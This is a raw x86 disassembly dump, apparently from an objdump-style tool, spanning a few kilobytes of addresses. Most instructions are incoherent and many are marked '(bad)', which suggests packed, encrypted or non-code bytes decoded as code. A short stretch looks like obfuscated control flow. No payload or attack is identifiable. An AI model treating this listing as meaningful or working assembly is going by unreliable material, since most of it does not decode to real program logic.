  414ede:	test   edx,ebp
  414ee0:	xchg   ebp,eax
  414ee1:	adc    DWORD PTR [edi+0xd],edi
  414ee4:	mul    ah
  414ee6:	stos   DWORD PTR es:[edi],eax
  414ee7:	pop    eax
  414ee8:	aaa    
  414ee9:	add    ebx,DWORD PTR [edi+eax*2-0x5e134828]
  414ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ef1:	xchg   edi,eax
  414ef2:	pop    ecx
  414ef3:	mov    edi,0xfa9ae27e
  414ef8:	lahf   
  414ef9:	cmp    edx,DWORD PTR [ecx-0x14]
  414efc:	jmp    0xe28e:0x444deb6e
  414f03:	test   eax,0x69de2e81
  414f08:	pop    esp
  414f09:	adc    ah,BYTE PTR [ecx]
  414f0b:	sub    al,0x67
  414f0d:	popa   
  414f0e:	inc    edi
  414f0f:	rol    DWORD PTR [esi-0x12564d98],cl
  414f15:	lods   eax,DWORD PTR ds:[esi]
  414f16:	imul   esp,DWORD PTR [esi+0x55],0xac8ee47d
  414f1d:	fucomp st(5)
  414f1f:	jmp    0x414f0f
  414f21:	ret    0x7848
  414f24:	aaa    
  414f25:	call   FWORD PTR [esi-0xd]
  414f28:	es rol ebp,0xa9
  414f2c:	loop   0x414f39
  414f2e:	sbb    al,0x8d
  414f30:	daa    
  414f31:	arpl   si,di
  414f33:	fist   DWORD PTR [edx]
  414f35:	lds    ebx,FWORD PTR [eax+edi*2-0x4fb44367]
  414f3c:	push   ss
  414f3d:	sbb    ch,BYTE PTR [ebx-0x7cd5fae0]
  414f43:	or     eax,0x45041688
  414f48:	jmp    0x414f9b
  414f4a:	push   es
  414f4b:	dec    ecx
  414f4c:	and    DWORD PTR [edi-0x70],ebx
  414f4f:	push   ebx
  414f50:	imul   ebp,esp,0x20133e5e
  414f56:	es mov al,0xc7
  414f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f5a:	lods   al,BYTE PTR ds:[esi]
  414f5b:	dec    esp
  414f5c:	cmc    
  414f5d:	fisub  DWORD PTR [eax]
  414f60:	adc    ebp,DWORD PTR [ebp+0x60]
  414f63:	xor    BYTE PTR [esi+0x368b4f92],cl
  414f69:	and    ch,BYTE PTR [ebx]
  414f6b:	(bad)  
  414f6c:	and    eax,0xf42783a0
  414f71:	pop    esi
  414f72:	aam    0x64
  414f74:	xchg   edi,eax
  414f75:	mov    al,0x14
  414f77:	repz ret 
  414f79:	out    dx,al
  414f7a:	cwde   
  414f7b:	fstp   st(2)
  414f7d:	sub    BYTE PTR [ebx+0x5c],dh
  414f80:	mov    ds:0x29f04fea,eax
  414f85:	(bad)  
  414f86:	xchg   esi,eax
  414f87:	pop    es
  414f88:	lods   eax,DWORD PTR ds:[esi]
  414f89:	pop    es
  414f8a:	mov    esp,0xd6369d3f
  414f8f:	sub    eax,0x7784510c
  414f94:	les    ebp,FWORD PTR [esi+0x44]
  414f97:	enter  0xb222,0x6e
  414f9b:	enter  0x25bf,0x39
  414f9f:	or     DWORD PTR [ebx+0x7a1ea480],ebx
  414fa5:	mov    edi,0x420d18d
  414faa:	mov    bh,bl
  414fac:	jmp    0x1a8062af
  414fb1:	and    ah,0x74
  414fb4:	(bad)  
  414fb5:	pop    esp
  414fb6:	push   ebx
  414fb7:	(bad)  
  414fb9:	fld    QWORD PTR [ecx]
  414fbb:	xor    esi,DWORD PTR [edx+ecx*8]
  414fbe:	in     eax,dx
  414fbf:	jp     0x414f8e
  414fc1:	add    BYTE PTR [ecx+0x28bbbb20],0xb7
  414fc8:	ins    DWORD PTR es:[edi],dx
  414fc9:	cld    
  414fca:	sar    BYTE PTR [ecx+0x2302e8c7],0x79
  414fd1:	cwde   
  414fd2:	neg    BYTE PTR [esi]
  414fd4:	outs   dx,BYTE PTR ds:[esi]
  414fd5:	stos   DWORD PTR es:[edi],eax
  414fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fd7:	(bad)  
  414fd8:	pop    ss
  414fd9:	scas   al,BYTE PTR es:[edi]
  414fda:	push   ebp
  414fdb:	fdiv   QWORD PTR [ebx+0x5d]
  414fde:	mov    al,0x3c
  414fe0:	push   ecx
  414fe1:	xchg   edx,eax
  414fe2:	push   cs
  414fe3:	jns    0x414f68
  414fe5:	rol    DWORD PTR [ecx],1
  414fe7:	ret    0x9f0
  414fea:	adc    DWORD PTR [ebx+0x258aea13],edx
  414ff0:	pop    ds
  414ff1:	or     DWORD PTR [edx+edx*2-0x27],eax
  414ff5:	jmp    0x542e:0xb636c266
  414ffc:	aad    0xfb
  414ffe:	push   esp
  414fff:	mov    ebx,0x70168673
  415004:	xchg   DWORD PTR ds:0x1ed6a509,ebp
  41500a:	ins    BYTE PTR es:[edi],dx
  41500b:	or     eax,0x216e0a37
  415010:	call   0x91d9:0xc2fd2a25
  415017:	pop    ecx
  415018:	mov    ds:0xa4f9d4bf,al
  41501d:	xchg   ecx,eax
  41501e:	pop    esi
  41501f:	cmp    eax,0xc5531082
  415024:	sti    
  415025:	jecxz  0x414fd9
  415027:	loopne 0x414fda
  415029:	pop    es
  41502a:	lea    ecx,[eax+ebx*1-0x691edb5f]
  415031:	mov    ds:0xe30a2777,al
  415036:	nop
  415037:	cmc    
  415038:	dec    ebp
  415039:	fwait
  41503a:	push   cs
  41503b:	cdq    
  41503c:	push   esp
  41503d:	ja     0x415027
  41503f:	imul   edi,DWORD PTR [esi],0x47a8fdf0
  415045:	in     al,0x3b
  415047:	pop    ebx
  415048:	push   edx
  415049:	stc    
  41504a:	outs   dx,BYTE PTR ds:[esi]
  41504b:	iret   
  41504c:	aaa    
  41504d:	xchg   BYTE PTR [ecx-0x23],al
  415050:	fnstsw WORD PTR [ecx]
  415052:	clc    
  415053:	enter  0x7e7d,0xf2
  415057:	in     al,dx
  415058:	std    
  415059:	mov    edi,0x6866c439
  41505e:	bnd je 0x415089
  415061:	or     BYTE PTR [eax],cl
  415063:	mov    eax,ds:0x86c0a571
  415068:	pop    esp
  415069:	jge    0x415087
  41506b:	enter  0x9408,0x87
  41506f:	jg     0x415096
  415071:	dec    ebx
  415072:	xchg   esi,eax
  415073:	adc    bl,BYTE PTR [eax+0x7cc82d06]
  415079:	out    0x88,al
  41507b:	sahf   
  41507c:	ds loop 0x41506f
  41507f:	hlt    
  415080:	push   es
  415081:	mov    dl,0xaa
  415083:	inc    ebp
  415084:	not    DWORD PTR [ecx-0x29]
  415087:	push   esp
  415088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415089:	sbb    al,0x16
  41508b:	cs scas eax,DWORD PTR es:[edi]
  41508d:	lods   eax,DWORD PTR es:[esi]
  41508f:	push   edi
  415090:	adc    eax,0xbcf01d34
  415095:	xor    ebx,DWORD PTR [esi-0x701ff9ef]
  41509b:	ret    0x138a
  41509e:	std    
  41509f:	jge    0x415038
  4150a1:	mov    al,0x29
  4150a3:	adc    BYTE PTR [edx+ecx*1+0x6a539234],ch
  4150aa:	sbb    eax,0xd1239f4
  4150af:	clc    
  4150b0:	fst    DWORD PTR ds:0xbd24e00f
  4150b6:	mov    ebp,0x5abef74c
  4150bb:	add    al,0x92
  4150bd:	jg     0x4150e0
  4150bf:	shl    BYTE PTR [esi+eiz*1-0x17],0x8e
  4150c4:	lds    ebp,FWORD PTR [edx+0x33]
  4150c7:	xchg   esp,eax
  4150c8:	mov    al,0xd0
  4150ca:	lods   eax,DWORD PTR ds:[esi]
  4150cb:	stc    
  4150cc:	pop    ecx
  4150cd:	pop    ecx
  4150ce:	dec    edi
  4150cf:	aaa    
  4150d0:	jae    0x4150d3
  4150d2:	inc    eax
  4150d3:	popf   
  4150d4:	into   
  4150d5:	cld    
  4150d6:	lahf   
  4150d7:	loopne 0x4150eb
  4150d9:	ss loop 0x415102
  4150dc:	(bad)  
  4150dd:	int3   
  4150de:	xor    esi,DWORD PTR [edi-0x73]
  4150e1:	add    DWORD PTR [edi],esi
  4150e3:	and    ebx,DWORD PTR [ebp+0x2543865a]
  4150e9:	lds    ecx,FWORD PTR [ebp+0x650a5d50]
  4150ef:	mov    bh,BYTE PTR [ecx+0x6ce25094]
  4150f5:	call   0xa2bc:0xf3ff
  4150fb:	sbb    al,BYTE PTR [esi-0x5f576c2b]
  415101:	adc    ah,BYTE PTR [edx+ebx*1+0x1a]
  415105:	sbb    eax,0x893e5c3d
  41510a:	add    ch,BYTE PTR gs:[ecx]
  41510d:	rcl    bx,1
  415110:	sbb    ah,BYTE PTR [esp+ebx*1-0x72]
  415114:	mov    esp,0x2c5526c5
  415119:	pop    edx
  41511a:	and    eax,0x416dca80
  41511f:	dec    eax
  415120:	push   0x33
  415122:	mov    ebp,0xaca61591
  415127:	mov    al,ds:0x6101a891
  41512c:	push   ss
  41512d:	lahf   
  41512e:	cmp    eax,0x9fb6b06c
  415133:	sub    dl,BYTE PTR [edi]
  415135:	adc    BYTE PTR [esi-0x3fc9ac0d],bh
  41513b:	pop    eax
  41513c:	jmp    0x1cda1a46
  415141:	pop    edx
  415142:	popf   
  415143:	dec    ebx
  415144:	push   0xffffffe4
  415146:	test   DWORD PTR [edi+0x6c5fde61],ecx
  41514c:	jp     0x4150d5
  41514e:	fstp   DWORD PTR [ecx]
  415150:	stc    
  415151:	sbb    BYTE PTR [ecx+edx*2],0x7
  415155:	xchg   ecx,eax
  415156:	push   edi
  415157:	lods   eax,DWORD PTR ds:[esi]
  415158:	push   ds
  415159:	xor    bh,bl
  41515b:	dec    edx
  41515c:	push   eax
  41515d:	sti    
  41515e:	mov    ds:0x1c0abe19,al
  415163:	push   edi
  415164:	add    DWORD PTR ds:0xac09b066,esi
  41516a:	sub    DWORD PTR [ebx+0x6f663cf5],0xfe1e8780
  415174:	mov    ecx,DWORD PTR [esi+edi*4-0x24]
  415178:	pop    ss
  415179:	cmp    al,0x4b
  41517b:	push   edx
  41517c:	fs mov edx,0x89e02b8c
  415182:	fmul   QWORD PTR gs:[ebx+0x55b9fc45]
  415189:	or     BYTE PTR [ecx+0x7],dl
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	(bad)  
  4151a5:	loop   0x415128
  4151a7:	inc    edi
  4151a8:	in     eax,dx
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	sub    ebx,esp
  4151b2:	pop    ss
  4151b3:	add    BYTE PTR [ecx-0x34],al
  4151b6:	cwde   
  4151b7:	push   ds
  4151b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151b9:	mov    esp,0x9413fbb0
  4151be:	inc    esp
  4151bf:	adc    al,0x6d
  4151c1:	xchg   ecx,eax
  4151c2:	pop    ss
  4151c3:	cld    
  4151c4:	mov    ds:0x84135823,eax
  4151c9:	push   eax
  4151ca:	test   eax,0xb89a15e1
  4151cf:	xchg   bp,ax
  4151d1:	shl    DWORD PTR [edi],0x2b
  4151d4:	pop    eax
  4151d5:	aam    0x5b
  4151d7:	dec    esi
  4151d8:	adc    esi,DWORD PTR ds:[edx]
  4151db:	xchg   esp,eax
  4151dc:	mov    dl,0xfb
  4151de:	mov    esp,0x26a7b34e
  4151e3:	mov    eax,ds:0x35985d9
  4151e8:	mov    ah,0x52
  4151ea:	pop    ds
  4151eb:	adc    al,0xb1
  4151ed:	pop    ebp
  4151ee:	dec    edi
  4151ef:	(bad)  
  4151f0:	mov    eax,0x6d27ec71
  4151f5:	int3   
  4151f6:	lock fcom DWORD PTR [ebx+0x64]
  4151fa:	ins    BYTE PTR es:[edi],dx
  4151fb:	(bad)  
  4151fc:	dec    esi
  4151fd:	fnsave [ebx+edx*8]
  415200:	mov    cl,BYTE PTR [edi-0x6a1344c3]
  415206:	js     0x415194
  415208:	pop    esi
  415209:	sub    DWORD PTR ds:0xaca56858,0x53358163
  415213:	jge    0x415220
  415215:	aas    
  415216:	ja     0x415285
  415218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415219:	add    eax,0x7a56d62d
  41521e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41521f:	push   ss
  415220:	lods   al,BYTE PTR ds:[esi]
  415221:	rcl    DWORD PTR [ecx-0x7ea7730c],cl
  415227:	adc    DWORD PTR [edx-0x4c1c1e28],ecx
  41522d:	fsubrp st(4),st
  41522f:	ins    DWORD PTR es:[edi],dx
  415230:	ja     0x41525b
  415232:	xchg   ecx,eax
  415233:	outs   dx,DWORD PTR ds:[esi]
  415234:	mov    ebx,0x201cefa4
  415239:	int    0x43
  41523b:	(bad)  
  41523c:	jecxz  0x41528c
  41523e:	mov    bh,0xcc
  415240:	fisttp QWORD PTR ds:0x29fa2420
  415246:	or     eax,0x8a0a548
  41524b:	inc    edi
  41524c:	pusha  
  41524d:	jl     0x4152bf
  41524f:	and    bl,cl
  415251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415252:	pop    ss
  415253:	scas   al,BYTE PTR es:[edi]
  415254:	mov    DWORD PTR [esi-0x61],ecx
  415257:	or     cl,dh
  415259:	retf   0xa1aa
  41525c:	je     0x41525f
  41525e:	cli    
  41525f:	(bad)  
  415260:	aad    0x41
  415262:	cmp    DWORD PTR fs:[edi],esp
  415265:	js     0x415292
  415267:	fwait
  415268:	dec    edx
  415269:	std    
  41526a:	xor    ecx,DWORD PTR [ebx-0x30]
  41526d:	in     al,dx
  41526e:	addr16 dec esp
  415270:	fisttp DWORD PTR [ecx+0x3e]
  415273:	popa   
  415274:	add    al,BYTE PTR [ebx-0x38bc3494]
  41527a:	mov    al,0x10
  41527c:	enter  0xd803,0x9b
  415280:	sbb    esi,DWORD PTR [ecx+0x199105e1]
  415286:	mov    DWORD PTR [edx-0x4e],eax
  415289:	jge    0x4152e1
  41528b:	cli    
  41528c:	imul   edi,ecx,0x63
  41528f:	in     al,0xd7
  415291:	les    ebx,FWORD PTR [edi+0x49]
  415294:	pop    ebp
  415295:	jbe    0x4152ba
  415297:	js     0x4152c3
  415299:	pop    eax
  41529a:	fsincos 
  41529c:	test   al,0xc0
  41529e:	xor    eax,DWORD PTR [edx]
  4152a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152a1:	ror    ch,0x94
  4152a4:	ret    0x7f96
  4152a7:	sub    al,0x87
  4152a9:	dec    BYTE PTR [ebp-0x20]
  4152ac:	aaa    
  4152ad:	mov    ds:0xa9a84446,eax
  4152b2:	lods   al,BYTE PTR ds:[esi]
  4152b3:	or     dh,BYTE PTR [ebp+0x6]
  4152b6:	shr    BYTE PTR [edi],1
  4152b8:	adc    DWORD PTR [edx+eiz*2],edx
  4152bb:	mov    ch,0x16
  4152bd:	es jg  0x4152d8
  4152c0:	aad    0x58
  4152c2:	retf   0x91f4
  4152c5:	sub    edi,esp
  4152c7:	inc    ebp
  4152c8:	fild   DWORD PTR [edx+0x1ab39512]
  4152ce:	cmp    eax,0xba97c742
  4152d3:	ins    DWORD PTR es:[edi],dx
  4152d4:	or     cl,bh
  4152d6:	pop    esi
  4152d7:	or     cl,cl
  4152d9:	outs   dx,BYTE PTR ds:[esi]
  4152da:	stc    
  4152db:	or     al,ah
  4152dd:	in     eax,0xbf
  4152df:	ins    DWORD PTR es:[edi],dx
  4152e0:	mov    ecx,0x98692db4
  4152e5:	push   ebp
  4152e6:	inc    esi
  4152e7:	mov    dl,0xb8
  4152e9:	push   esp
  4152ea:	nop
  4152eb:	hlt    
  4152ec:	ja     0x41532f
  4152ee:	leave  
  4152ef:	outs   dx,BYTE PTR ds:[esi]
  4152f0:	fldenv [ebx]
  4152f2:	add    cl,BYTE PTR [esi+0x4b]
  4152f5:	outs   dx,BYTE PTR ds:[esi]
  4152f6:	fisubr WORD PTR [eax]
  4152f8:	call   0xcc5a:0xa86811a6
  4152ff:	lds    edi,FWORD PTR [ecx]
  415301:	or     BYTE PTR [ebx],bh
  415303:	and    BYTE PTR [eax+0x434b5368],al
  415309:	or     esp,eax
  41530b:	in     al,dx
  41530c:	mov    ds:0x5c8b475,al
  415311:	outs   dx,BYTE PTR ds:[esi]
  415312:	das    
  415313:	sbb    bh,BYTE PTR [ebp+0x6b371053]
  415319:	jp     0x4152d4
  41531b:	fst    DWORD PTR [edx+0x27]
  41531e:	(bad)  
  41531f:	mov    ebx,0x18f63a95
  415324:	mov    ecx,0x51c8f051
  415329:	jb     0x4152ee
  41532b:	shr    BYTE PTR [ebx],cl
  41532d:	aad    0x62
  41532f:	js     0x415323
  415331:	clc    
  415332:	inc    esi
  415333:	int3   
  415334:	in     eax,0xd2
  415336:	and    BYTE PTR [ecx+0x14f1736e],dh
  41533c:	cmp    eax,DWORD PTR [eax]
  41533e:	jmp    0xa0c6:0xd6f84b07
  415345:	(bad)
  415349:	cmp    esi,DWORD PTR [ebx-0x3ec885e0]
  41534f:	xchg   esi,eax
  415350:	(bad)  
  415351:	retf   
  415352:	div    bh
  415354:	addr16 (bad) 
  415356:	jle    0x415323
  415358:	xchg   edi,eax
  415359:	fs test eax,0x93585007
  41535f:	or     ebx,0xde815308
  415365:	inc    ebx
  415366:	dec    ebx
  415368:	repz xchg esp,eax
  41536a:	cld    
  41536b:	repz adc ch,BYTE PTR [ebx+edi*4]
  41536f:	pop    ebx
  415370:	xor    ch,0x38
  415373:	mov    DWORD PTR [esi-0x7165a4f7],edi
  415379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41537a:	push   cs
  41537b:	adc    eax,0x5c4a0121
  415380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415381:	aam    0x17
  415383:	inc    BYTE PTR [edx+ebp*8-0x343cc1d3]
  41538a:	jb     0x415375
  41538c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41538d:	retf   0x6ae9
  415390:	inc    edx
  415391:	push   es
  415392:	in     al,0x84
  415394:	loope  0x415382
  415396:	cld    
  415397:	push   ebp
  415398:	inc    DWORD PTR [eax-0x21]
  41539b:	or     esp,0xfffffff8
  41539e:	pop    eax
  41539f:	loopne 0x415344
  4153a1:	(bad)  
  4153a2:	into   
  4153a3:	sbb    DWORD PTR [esi+0x2f],esp
  4153a6:	lds    edx,FWORD PTR [ebp+esi*4-0x19]
  4153aa:	neg    DWORD PTR [edx]
  4153ac:	xchg   edi,eax
  4153ad:	mov    ds:0xed45eafe,eax
  4153b2:	dec    ebx
  4153b3:	(bad)  
  4153b5:	repz icebp 
  4153b7:	mov    ch,cl
  4153b9:	ja     0x4153e9
  4153bb:	cmp    ah,bl
  4153bd:	jbe    0x41542c
  4153bf:	xchg   BYTE PTR [ebx+eax*4-0x2260881f],cl
  4153c6:	in     al,0xcf
  4153c8:	popa   
  4153c9:	add    BYTE PTR ds:0xcb633323,bh
  4153cf:	cmp    DWORD PTR [eax-0x7e982488],0xffffff95
  4153d6:	es sub al,0xb7
  4153d9:	pop    ds
  4153da:	sub    eax,0x7127b85c
  4153df:	lea    ebx,[edx]
  4153e1:	lds    ebp,FWORD PTR [ecx]
  4153e3:	mov    ebx,0x866ca6ca
  4153e8:	pop    ds
  4153e9:	popf   
  4153ea:	adc    eax,0xedc85079
  4153ef:	out    0xc6,al
  4153f1:	iret   
  4153f2:	xchg   ecx,eax
  4153f3:	sub    bh,BYTE PTR [edi+ebp*8]
  4153f6:	fwait
  4153f7:	mov    ch,al
  4153f9:	or     al,0xa8
  4153fb:	sub    eax,0xbcdee49c
  415400:	mov    esi,0xd38f62fe
  415405:	jl     0x4153c0
  415407:	and    DWORD PTR [esi+eiz*1+0x90584ec],0x18
  41540f:	jl     0x41542a
  415411:	xchg   ebp,eax
  415412:	shl    BYTE PTR [edi],0xca
  415415:	fnsave [edi+0x70]
  415418:	cli    
  415419:	add    al,0x52
  41541b:	jae    0x4153c2
  41541d:	xor    BYTE PTR [edx-0x5f2648cf],ch
  415423:	mov    edx,esp
  415425:	dec    esp
  415426:	bound  esi,QWORD PTR [edi+0x419c53f1]
  41542c:	cdq    
  41542d:	mov    eax,ds:0x91d246ea
  415432:	sub    BYTE PTR [ebx],dh
  415434:	pop    ebx
  415435:	xor    BYTE PTR [ecx-0x28df83c3],0x28
  41543c:	in     al,dx
  41543d:	and    bl,BYTE PTR [edi-0x32]
  415440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415441:	mov    cl,0xdb
  415443:	lock mov ebp,0xf45c98ed
  415449:	test   eax,0x68c0ab90
  41544e:	data16 hlt 
  415450:	inc    ecx
  415451:	xlat   BYTE PTR ds:[ebx]
  415452:	dec    edi
  415453:	inc    ebx
  415454:	cwde   
  415455:	shr    BYTE PTR [edx],0xb0
  415458:	xchg   DWORD PTR [esi],ecx
  41545a:	adc    DWORD PTR [eax],eax
  41545c:	je     0x41544b
  41545e:	push   es
  41545f:	sbb    BYTE PTR [ecx+0x64],bl
  415462:	mov    esi,0x52acdbbc
  415467:	aas    
  415468:	sti    
  415469:	or     DWORD PTR ds:0x1879f292,esp
  41546f:	pop    ss
  415470:	mov    eax,ds:0xd993fd76
  415475:	pop    ds
  415476:	xchg   ecx,eax
  415477:	add    eax,edx
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x84
  4154c8:	jne    0x4154ac
  4154ca:	out    dx,al
  4154cb:	add    bh,BYTE PTR ss:[edi+0x70]
  4154cf:	mov    ecx,0xc570707e
  4154d4:	sbb    DWORD PTR [edx+0x57],0x4
  4154d8:	jecxz  0x415510
  4154da:	lds    edi,FWORD PTR [ebx+ecx*8+0x58]
  4154de:	out    0x14,al
  4154e0:	or     esp,DWORD PTR [ebx-0x99374f2]
  4154e6:	jb     0x41548f
  4154e8:	ror    BYTE PTR [edi+ebp*8+0x16],1
  4154ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154ed:	pop    ecx
  4154ee:	mov    eax,ds:0xc5a840fa
  4154f3:	dec    ebp
  4154f4:	into   
  4154f5:	dec    ecx
  4154f6:	add    bh,ch
  4154f8:	sar    BYTE PTR [edi+0x50],0xc8
  4154fc:	sub    edi,esp
  4154fe:	pop    es
  4154ff:	and    edi,DWORD PTR [ecx-0x7a968680]
  415505:	add    dh,BYTE PTR [edi+edi*8-0x7f726239]
  41550c:	dec    ebx
  41550d:	jnp    0x415562
  41550f:	in     eax,dx
  415510:	mov    al,ds:0x160a10ca
  415515:	rcl    BYTE PTR [esi+0x619ea6ad],1
  41551b:	fisttp QWORD PTR [edx+0x20d35469]
  415521:	pusha  
  415522:	jbe    0x4154c3
  415524:	pop    edx
  415525:	jge    0x4154ad
  415527:	or     ebx,DWORD PTR ds:0xf4ad9803
  41552d:	out    0xa2,al
  41552f:	sbb    bl,BYTE PTR [ecx+0x5f]
  415532:	jb     0x4154bd
  415534:	xor    BYTE PTR [ecx],0xc3
  415537:	fwait
  415538:	jecxz  0x415563
  41553a:	dec    ecx
  41553b:	adc    BYTE PTR [edi],0x60
  41553e:	sbb    cl,bh
  415540:	cwde   
  415541:	je     0x4154de
  415543:	mov    al,BYTE PTR [edx-0x1d191a1b]
  415549:	xchg   DWORD PTR [esi+eax*8-0x49],esi
  41554d:	xor    ecx,esp
  41554f:	retf   0x7010
  415552:	imul   ebp,DWORD PTR [ebp-0x34fb2793],0xffffffca
  415559:	ds fwait
  41555b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41555c:	xlat   BYTE PTR ds:[ebx]
  41555d:	pop    es
  41555e:	in     eax,dx
  41555f:	bound  eax,QWORD PTR [edi-0x766d259a]
  415565:	inc    ebx
  415566:	jae    0x4155bd
  415568:	mov    eax,0x11a8b9c0
  41556d:	push   ss
  41556e:	les    esi,FWORD PTR [eax+0x692d374f]
  415574:	aaa    
  415575:	cdq    
  415576:	ins    DWORD PTR es:[edi],dx
  415577:	mov    ebx,0xf2e99a39
  41557c:	leave  
  41557d:	sub    edx,ebx
  41557f:	in     eax,0x20
  415581:	mul    DWORD PTR [eax+0x74]
  415584:	cmp    eax,0x38980c78
  415589:	push   ss
  41558a:	inc    esp
  41558b:	push   esi
  41558c:	out    0x42,al
  41558e:	and    eax,0x969fb3eb
  415593:	or     eax,0x45eb54e6
  415598:	mov    bh,0x42
  41559a:	inc    edi
  41559b:	mov    eax,0xc7708b62
  4155a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155a1:	in     al,dx
  4155a2:	fidiv  DWORD PTR [ecx+0x20f06cf3]
  4155a8:	mov    bl,0xf4
  4155aa:	rol    BYTE PTR [ecx],1
  4155ac:	sub    eax,0xaf87a5dc
  4155b1:	dec    ebx
  4155b2:	mov    esi,0xe428e72c
  4155b7:	not    DWORD PTR [ebp-0x4b]
  4155ba:	mov    DWORD PTR [esp+esi*1],esi
  4155bd:	shl    BYTE PTR [esi+ecx*4-0x4b8bdabf],1
  4155c4:	cmp    BYTE PTR ds:0x2a897602,cl
  4155ca:	xchg   ecx,eax
  4155cb:	cmp    cl,BYTE PTR [ecx]
  4155cd:	test   eax,0xac257488
  4155d2:	es std 
  4155d4:	inc    esi
  4155d5:	aaa    
  4155d6:	xor    esp,DWORD PTR [ebx+eiz*2-0x137b37bc]
  4155dd:	iret   
  4155de:	inc    eax
  4155df:	cs lods al,BYTE PTR es:[esi]
  4155e2:	call   0xa3f39233
  4155e7:	lahf   
  4155e8:	pushf  
  4155e9:	adc    DWORD PTR [esi-0x33],edx
  4155ec:	mov    bl,BYTE PTR [ebx]
  4155ee:	cmp    ebx,ecx
  4155f0:	jmp    0xa1a:0x110fea46
  4155f7:	jmp    0xac1deccb
  4155fc:	pop    ecx
  4155fd:	mov    dl,0x33
  4155ff:	shufps xmm6,XMMWORD PTR [edi],0x41
  415603:	jns    0x415672
  415605:	mul    DWORD PTR [edx+ecx*4]
  415608:	xor    eax,0x2a28344a
  41560d:	test   BYTE PTR [esi-0x2e991210],0x69
  415614:	cwde   
  415615:	fwait
  415616:	adc    esi,DWORD PTR [ebx+0x52]
  415619:	jecxz  0x4155b6
  41561b:	adc    BYTE PTR [edi+0x2aa403cf],dl
  415621:	jae    0x4155e4
  415623:	cmp    ch,0xb7
  415626:	add    eax,0x46aaa796
  41562b:	sub    BYTE PTR [ebx],bh
  41562d:	icebp  
  41562e:	dec    edx
  41562f:	pushf  
  415630:	add    ebx,edx
  415632:	sub    al,ah
  415634:	mov    ebx,0x93cfa372
  415639:	push   edi
  41563a:	gs add bl,al
  41563d:	xor    eax,0x5a69c873
  415642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415643:	loopne 0x4155d3
  415645:	(bad)  
  415646:	sbb    DWORD PTR [edi+0x72],edx
  415649:	sbb    al,0x6d
  41564b:	lea    ebx,[ebx+0x61]
  41564e:	(bad)  
  415650:	pop    eax
  415651:	out    0xb8,al
  415653:	xchg   ecx,eax
  415654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415655:	pop    ecx
  415656:	scas   al,BYTE PTR es:[edi]
  415657:	cli    
  415658:	mov    al,ds:0x1c3f69d
  41565d:	stc    
  41565e:	sub    al,0xe9
  415660:	mov    edi,0xc249947f
  415665:	add    edx,eax
  415667:	or     esp,DWORD PTR [esi+0x560d6904]
  41566d:	xor    al,0x99
  41566f:	stc    
  415670:	call   0x5fa2:0x2c3de5f7
  415677:	adc    esi,DWORD PTR [esi+0x2c]
  41567a:	push   cs
  41567b:	call   0xa5b1:0xc48c446f
  415682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415683:	retf   
  415684:	mov    WORD PTR [eax+ecx*2-0x671f766a],gs
  41568b:	jno    0x415624
  41568d:	fsubr  QWORD PTR [esi+eax*4-0xa1fa5c8]
  415694:	xor    BYTE PTR [edi-0xa],al
  415697:	je     0x415684
  415699:	aas    
  41569a:	les    ebp,FWORD PTR [ebx+0x71]
  41569d:	pop    eax
  41569e:	cmp    DWORD PTR ds:0x2308cd79,0x490193ad
  4156a8:	mov    cl,0xee
  4156aa:	inc    esp
  4156ab:	or     ch,dh
  4156ad:	inc    esi
  4156ae:	cmp    al,0xf0
  4156b0:	cmp    ebp,esi
  4156b2:	adc    al,0xea
  4156b4:	je     0x41572b
  4156b6:	repnz shr BYTE PTR [esi-0x78fc0f96],0x64
  4156be:	push   ebp
  4156bf:	clc    
  4156c0:	dec    eax
  4156c1:	sbb    DWORD PTR [ecx+0x73],ecx
  4156c4:	es xor al,0x8a
  4156c7:	int3   
  4156c8:	lsl    esi,WORD PTR ds:[edi-0x3e]
  4156cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156ce:	dec    edi
  4156cf:	sub    BYTE PTR [ecx+0x15],ah
  4156d2:	popf   
